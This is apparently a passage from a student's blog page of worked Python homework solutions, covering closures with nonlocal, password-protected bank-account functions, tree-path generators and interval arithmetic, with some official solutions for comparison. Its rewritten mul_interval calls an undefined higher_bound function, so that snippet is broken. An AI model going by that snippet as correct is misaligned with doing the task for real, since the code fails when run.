class="keyword">else</span>:</span><br><span class="line">            m[s] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> m[s]</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The PDF solution(smart and beautiful, general)</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_counter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return a counter function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2 = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b') + c2('b')</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    m = &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">counter</span><span class="params">(key)</span>:</span></span><br><span class="line">        m[key] = m.get(key, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> m[key]</span><br><span class="line">    <span class="keyword">return</span> counter</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_counter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Return a counter function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('a')</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2 = make_counter()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c2('b')</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; c('b') + c2('b')</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    m = &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">counter</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">in</span> m:</span><br><span class="line">            m[s] = <span class="number">0</span></span><br><span class="line">        m[s] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> m[s]</span><br><span class="line">    <span class="keyword">return</span> counter</span><br></pre></td></tr></table></figure>

<h2 id="Q6-Next-Fibonacci"><a href="#Q6-Next-Fibonacci" class="headerlink" title="Q6: Next Fibonacci"></a>Q6: Next Fibonacci</h2><p>Write a function <code>make_fib</code> that returns a function that returns the next Fibonacci number each time it is called. (The Fibonacci sequence begins with 0 and then 1, after which each element is the sum of the preceding two.) Use a <code>nonlocal</code> statement!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_fib</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Returns a function that returns the next Fibonacci number</span></span><br><span class="line"><span class="string">    every time it is called.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib = make_fib()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib()</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib()</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib()</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib()</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib()</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib2 = make_fib()</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib() + sum([fib2() for _ in range(5)])</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    current, next = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> current, next</span><br><span class="line">        result = current</span><br><span class="line">        current, next = next, current + next</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> fib</span><br></pre></td></tr></table></figure>
<h2 id="Q7-Password-Protected-Account"><a href="#Q7-Password-Protected-Account" class="headerlink" title="Q7: Password Protected Account"></a>Q7: Password Protected Account</h2><p>In lecture, we saw how to use functions to create mutable objects. Here, for example, is the function <code>make_withdraw</code> which produces a function that can withdraw money from an account:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_withdraw</span><span class="params">(balance)</span>:</span></span><br><span class="line">    <span class="string">"""Return a withdraw function with BALANCE as its starting balance.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; withdraw = make_withdraw(1000)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; withdraw(100)</span></span><br><span class="line"><span class="string">    900</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; withdraw(100)</span></span><br><span class="line"><span class="string">    800</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; withdraw(900)</span></span><br><span class="line"><span class="string">    'Insufficient funds'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">withdraw</span><span class="params">(amount)</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> balance</span><br><span class="line">        <span class="keyword">if</span> amount &gt; balance:</span><br><span class="line">           <span class="keyword">return</span> <span class="string">'Insufficient funds'</span></span><br><span class="line">        balance = balance - amount</span><br><span class="line">        <span class="keyword">return</span> balance</span><br><span class="line">    <span class="keyword">return</span> withdraw</span><br></pre></td></tr></table></figure>
<p>Write a version of the <code>make_withdraw</code> function that returns password-protected withdraw functions. That is, <code>make_withdraw</code> should take a password argument (a string) in addition to an initial balance. The returned function should take two arguments: an amount to withdraw and a password.</p>
<p>A password-protected <code>withdraw</code> function should only process withdrawals that include a password that matches the original. Upon receiving an incorrect password, the function should:</p>
<ol>
<li><p>Store that incorrect password in a list, and</p>
</li>
<li><p>Return the string ‘Incorrect password’.<br>If a withdraw function has been called three times with incorrect passwords <code>p1</code>, <code>p2</code>, and <code>p3</code>, then it is locked. All subsequent calls to the function should return:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Your account is locked. Attempts: [&lt;p1&gt;, &lt;p2&gt;, &lt;p3&gt;]&quot;</span><br></pre></td></tr></table></figure>
<p>The incorrect passwords may be the same or different:<br><span style="color:red">My solution<span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_withdraw</span><span class="params">(balance, password)</span>:</span></span><br><span class="line">   <span class="string">"""Return a password-protected withdraw function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w = make_withdraw(100, 'hax0r')</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(25, 'hax0r')</span></span><br><span class="line"><span class="string">   75</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; error = w(90, 'hax0r')</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; error</span></span><br><span class="line"><span class="string">   'Insufficient funds'</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; error = w(25, 'hwat')</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; error</span></span><br><span class="line"><span class="string">   'Incorrect password'</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; new_bal = w(25, 'hax0r')</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; new_bal</span></span><br><span class="line"><span class="string">   50</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(75, 'a')</span></span><br><span class="line"><span class="string">   'Incorrect password'</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(10, 'hax0r')</span></span><br><span class="line"><span class="string">   40</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(20, 'n00b')</span></span><br><span class="line"><span class="string">   'Incorrect password'</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(10, 'hax0r')</span></span><br><span class="line"><span class="string">   "Your account is locked. Attempts: ['hwat', 'a', 'n00b']"</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; w(10, 'l33t')</span></span><br><span class="line"><span class="string">   "Your account is locked. Attempts: ['hwat', 'a', 'n00b']"</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; type(w(10, 'l33t')) == str</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   """</span></span><br><span class="line">   <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">   l = []</span><br><span class="line">   num = <span class="number">0</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">withdraw</span><span class="params">(amount, p)</span>:</span></span><br><span class="line">       <span class="keyword">nonlocal</span> num, balance</span><br><span class="line">       <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="string">'Your account is locked. Attempts: '</span> + str(l)</span><br><span class="line">       <span class="keyword">if</span> p != password:</span><br><span class="line">           l.append(p)</span><br><span class="line">           num += <span class="number">1</span></span><br><span class="line">           <span class="keyword">return</span> <span class="string">'Incorrect password'</span></span><br><span class="line">       <span class="keyword">if</span> amount &gt; balance:</span><br><span class="line">           <span class="keyword">return</span> <span class="string">'Insufficient funds'</span></span><br><span class="line">       balance -= amount</span><br><span class="line">       <span class="keyword">return</span> balance</span><br><span class="line">   <span class="keyword">return</span> withdraw</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The PDF solution, which have not a num variable.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_withdraw</span><span class="params">(balance, password)</span>:</span></span><br><span class="line">    <span class="string">"""Return a password-protected withdraw function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w = make_withdraw(100, 'hax0r')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(25, 'hax0r')</span></span><br><span class="line"><span class="string">    75</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; error = w(90, 'hax0r')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; error</span></span><br><span class="line"><span class="string">    'Insufficient funds'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; error = w(25, 'hwat')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; error</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new_bal = w(25, 'hax0r')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; new_bal</span></span><br><span class="line"><span class="string">    50</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(75, 'a')</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(10, 'hax0r')</span></span><br><span class="line"><span class="string">    40</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(20, 'n00b')</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(10, 'hax0r')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['hwat', 'a', 'n00b']"</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(10, 'l33t')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['hwat', 'a', 'n00b']"</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; type(w(10, 'l33t')) == str</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    attempts = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">withdraw</span><span class="params">(amount, password_attempt)</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> balance</span><br><span class="line">        <span class="keyword">if</span> len(attempts) == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Your account is locked. Attempts: '</span> + str(attempts)</span><br><span class="line">        <span class="keyword">if</span> password_attempt != password:</span><br><span class="line">            attempts.append(password_attempt)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Incorrect password'</span></span><br><span class="line">        <span class="keyword">if</span> amount &gt; balance:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Insufficient funds'</span></span><br><span class="line">        balance = balance - amount</span><br><span class="line">        <span class="keyword">return</span> balance</span><br><span class="line">    <span class="keyword">return</span> withdraw</span><br></pre></td></tr></table></figure>
<h2 id="Q8-Joint-Account"><a href="#Q8-Joint-Account" class="headerlink" title="Q8: Joint Account"></a>Q8: Joint Account</h2><p>Suppose that our banking system requires the ability to make joint accounts. Define a function <code>make_joint</code> that takes three arguments.</p>
</li>
<li><p>A password-protected <code>withdraw</code> function,</p>
</li>
<li><p>The password with which that <code>withdraw</code> function was defined, and</p>
</li>
<li><p>A new password that can also access the original account.<br>The <code>make_joint</code> function returns a <code>withdraw</code> function that provides additional access to the original account using either the new or old password. Both functions draw from the same balance. Incorrect passwords provided to either function will be stored and cause the functions to be locked after three wrong attempts.</p>
</li>
</ol>
<p>Hint: The solution is short (less than 10 lines) and contains no string literals! The key is to call <code>withdraw</code> with the right password and amount, then interpret the result. You may assume that all failed attempts to withdraw will return some string (for incorrect passwords, locked accounts, or insufficient funds), while successful withdrawals will return a number.</p>
<p>Use <code>type(value) == str</code> to test if some <code>value</code> is a string:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_joint</span><span class="params">(withdraw, old_password, new_password)</span>:</span></span><br><span class="line">    <span class="string">"""Return a password-protected withdraw function that has joint access to</span></span><br><span class="line"><span class="string">    the balance of withdraw.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w = make_withdraw(100, 'hax0r')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(25, 'hax0r')</span></span><br><span class="line"><span class="string">    75</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_joint(w, 'my', 'secret')</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j = make_joint(w, 'hax0r', 'secret')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(25, 'secret')</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j(25, 'secret')</span></span><br><span class="line"><span class="string">    50</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j(25, 'hax0r')</span></span><br><span class="line"><span class="string">    25</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j(100, 'secret')</span></span><br><span class="line"><span class="string">    'Insufficient funds'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2 = make_joint(j, 'secret', 'code')</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2(5, 'code')</span></span><br><span class="line"><span class="string">    20</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2(5, 'secret')</span></span><br><span class="line"><span class="string">    15</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2(5, 'hax0r')</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2(25, 'password')</span></span><br><span class="line"><span class="string">    'Incorrect password'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j2(5, 'secret')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['my', 'secret', 'password']"</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; j(5, 'secret')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['my', 'secret', 'password']"</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; w(5, 'hax0r')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['my', 'secret', 'password']"</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_joint(w, 'hax0r', 'hello')</span></span><br><span class="line"><span class="string">    "Your account is locked. Attempts: ['my', 'secret', 'password']"</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    error = withdraw(<span class="number">0</span>, old_password)</span><br><span class="line">    <span class="keyword">if</span> type(error) == str:</span><br><span class="line">         <span class="keyword">return</span> error</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">joint</span><span class="params">(amount, attempt)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> attempt == new_password:</span><br><span class="line">            <span class="keyword">return</span> withdraw(amount, old_password)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> withdraw(amount, attempt)</span><br><span class="line">    <span class="keyword">return</span> joint</span><br></pre></td></tr></table></figure>
<h1 id="Generators"><a href="#Generators" class="headerlink" title="Generators"></a>Generators</h1><h2 id="Q9-Generate-Paths"><a href="#Q9-Generate-Paths" class="headerlink" title="Q9: Generate Paths"></a>Q9: Generate Paths</h2><p>Define a generator function <code>generate_paths</code> which takes in a tree <code>t</code>, a value <code>x</code>, and yields each path from the root of <code>t</code> to a node that has label <code>x</code>. Each path should be represented as a list of the labels along that path in the tree. You may yield the paths in any order.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_paths</span><span class="params">(t, x)</span>:</span></span><br><span class="line">    <span class="string">"""Yields all possible paths from the root of t to a node with the label x as a list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t1 = tree(1, [tree(2, [tree(3), tree(4, [tree(6)]), tree(5)]), tree(5)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(t1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        3</span></span><br><span class="line"><span class="string">        4</span></span><br><span class="line"><span class="string">          6</span></span><br><span class="line"><span class="string">        5</span></span><br><span class="line"><span class="string">      5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; next(generate_paths(t1, 6))</span></span><br><span class="line"><span class="string">    [1, 2, 4, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; path_to_5 = generate_paths(t1, 5)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sorted(list(path_to_5))</span></span><br><span class="line"><span class="string">    [[1, 2, 5], [1, 5]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t2 = tree(0, [tree(2, [t1])])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(t2)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">            3</span></span><br><span class="line"><span class="string">            4</span></span><br><span class="line"><span class="string">              6</span></span><br><span class="line"><span class="string">            5</span></span><br><span class="line"><span class="string">          5</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; path_to_2 = generate_paths(t2, 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sorted(list(path_to_2))</span></span><br><span class="line"><span class="string">    [[0, 2], [0, 2, 1, 2]]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> label(t) == x:</span><br><span class="line">        <span class="keyword">yield</span> [x]</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(t):</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> generate_paths(b, x):</span><br><span class="line">            <span class="keyword">yield</span> [label(t)] + path</span><br></pre></td></tr></table></figure>
<p><span style="color:red">If our current label is equal to x, we’ve found a path from the root to a node containing x containing only our current label, so we should yield that. From there, we’ll see if there are any paths starting from one of our branches that ends at a node containing x. If we find these “partial paths” we can simply add our current label to the beinning of a path to obtain a path starting from the root.</span></p>
<p><span style="color:red">In order to do this, we’ll create a generator for each of the branches which yields these “partial paths”. By calling generate_paths on each of the branches, we’ll create exactly this generator! Then, since a generator is also an iterable, we can iterate over the paths in this generator and yield the result of concatenating it with our current label.</span></p>
<h1 id="Interval"><a href="#Interval" class="headerlink" title="Interval"></a>Interval</h1><p><strong>Acknowledgements</strong>. This interval arithmetic example is based on a classic problem from Structure and Interpretation of Computer Programs, Section 2.1.4.</p>
<p><strong>Introduction</strong>. Alyssa P. Hacker is designing a system to help people solve engineering problems. One feature she wants to provide in her system is the ability to manipulate inexact quantities (such as measured parameters of physical devices) with known precision, so that when computations are done with such approximate quantities the results will be numbers of known precision.</p>
<p>Alyssa’s idea is to implement interval arithmetic as a set of arithmetic operations for combining “intervals” (objects that represent the range of possible values of an inexact quantity). The result of adding, subracting, multiplying, or dividing two intervals is itself an interval, representing the range of the result.</p>
<p>Alyssa postulates the existence of an abstract object called an “interval” that has two endpoints: a lower bound and an upper bound. She also presumes that, given the endpoints of an interval, she can construct the interval using the data constructor interval. Using the constructor and selectors, she defines the following operations:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_interval</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return a string representation of interval x."""</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&#123;0&#125; to &#123;1&#125;'</span>.format(lower_bound(x), upper_bound(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_interval</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""Return an interval that contains the sum of any value in interval x and</span></span><br><span class="line"><span class="string">    any value in interval y."""</span></span><br><span class="line">    lower = lower_bound(x) + lower_bound(y)</span><br><span class="line">    upper = upper_bound(x) + upper_bound(y)</span><br><span class="line">    <span class="keyword">return</span> interval(lower, upper)</span><br></pre></td></tr></table></figure>
<h2 id="Q10-Interval-Abstraction"><a href="#Q10-Interval-Abstraction" class="headerlink" title="Q10: Interval Abstraction"></a>Q10: Interval Abstraction</h2><p>Alyssa’s program is incomplete because she has not specified the implementation of the interval abstraction. She has implemented the constructor for you; fill in the implementation of the selectors.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interval</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""Construct an interval from a to b."""</span></span><br><span class="line">    <span class="keyword">assert</span> a &lt;= b, <span class="string">'Lower bound cannot be greater than upper bound'</span></span><br><span class="line">    <span class="keyword">return</span> [a, b]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lower_bound</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the lower bound of interval x."""</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upper_bound</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the upper bound of interval x."""</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>Louis Reasoner has also provided an implementation of interval multiplication. Beware: there are some data abstraction violations, so help him fix his code before someone sets it on fire.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_interval</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""Return the interval that contains the product of any value in x and any</span></span><br><span class="line"><span class="string">    value in y."""</span></span><br><span class="line">    p1 = x[<span class="number">0</span>] * y[<span class="number">0</span>]</span><br><span class="line">    p2 = x[<span class="number">0</span>] * y[<span class="number">1</span>]</span><br><span class="line">    p3 = x[<span class="number">1</span>] * y[<span class="number">0</span>]</span><br><span class="line">    p4 = x[<span class="number">1</span>] * y[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> [min(p1, p2, p3, p4), max(p1, p2, p3, p4)]</span><br></pre></td></tr></table></figure>
<p>The modification</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_interval</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""Return the interval that contains the product of any value in x and any value in y."""</span></span><br><span class="line">    p1 = lower_bound(x) * lower_bound(y)</span><br><span class="line">    p2 = lower_bound(x) * upper_bound(y)</span><br><span class="line">    p3 = higher_bound(x) * lower_bound(y)</span><br><span class="line">    p4 = higher_bound(x) * upper_bound(y)</span><br><span class="line">    <span class="keyword">return</span> [min(p1, p2, p3, p4), max(p1, p2, p3, p4)]</span><br></pre></td></tr></table></figure>
<h2 id="Q11-Sub-Interval"><a href="#Q11-Sub-Interval" class="headerlink" title="Q11: Sub Interval"></a>Q11: Sub Interval</h2><p>Using reasoning analogous to Alyssa’s, define a subtraction function for intervals. Try to reuse functions that have already been implemented if you find yourself repeating code.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_interval</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""Return the interval that contains the difference between any value in x and any value in y."""</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    negative_y = interval(-upper_bound(y), -lower_bound(y))</span><br><span class="line">    <span class="keyword">return</span> add_interval(x, negative_y)</span><br></pre></td></tr></table></figure>
<h2 id="Q12-Div-Interval"><a href="#Q12-Div-Interval" class="headerlink" title="Q12: Div Interval"></a>Q12: Div Interval</h2><p>Alyssa implements division below by multiplying by the reciprocal of <code>y</code>. Ben Bitdiddle, an expert systems programmer, looks over Alyssa’s shoulder and comments that it is not clear what it means to divide by an interval that spans zero. Add an <code>assert</code> statement to Alyssa’s code to ensure that no such interval is used as a divisor:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_interval</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""Return the interval that contains the quotient of any value in x divided by</span></span><br><span class="line"><span class="string">    any value in y. Division is implemented as the multiplication of x by the</span></span><br><span class="line"><span class="string">    reciprocal of y."""</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">assert</span> lower_bound(y) &gt; <span class="number">0</span> <span class="keyword">or</span> upper_bound(y) &lt; <span class="number">0</span>, <span class="string">'The divisor cannot contain 0'</span></span><br><span class="line">    reciprocal_y = interval(<span class="number">1</span>/upper_bound(y), <span class="number">1</span>/lower_bound(y))</span><br><span class="line">    <span class="keyword">return</span> mul_interval(x, reciprocal_y)</span><br></pre></td></tr></table></figure>
<h2 id="Q13-Par-Diff"><a href="#Q13-Par-Diff" class="headerlink" title="Q13: Par Diff"></a>Q13: Par Diff</h2><p>After considerable work, Alyssa P. Hacker delivers her finished system. Several years later, after she has forgotten all about it, she gets a frenzied call from an irate user, Lem E. Tweakit. It seems that Lem has noticed that the formula for parallel resistors can be written in two algebraically equivalent ways:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">par1(r1, r2) &#x3D; (r1 * r2) &#x2F; (r1 + r2)</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">par2(r1, r2) &#x3D; 1 &#x2F; (1&#x2F;r1 + 1&#x2F;r2)</span><br></pre></td></tr></table></figure>
<p>He has written the following two programs, each of which computes the <code>parallel_resistors</code> formula differently::</p>
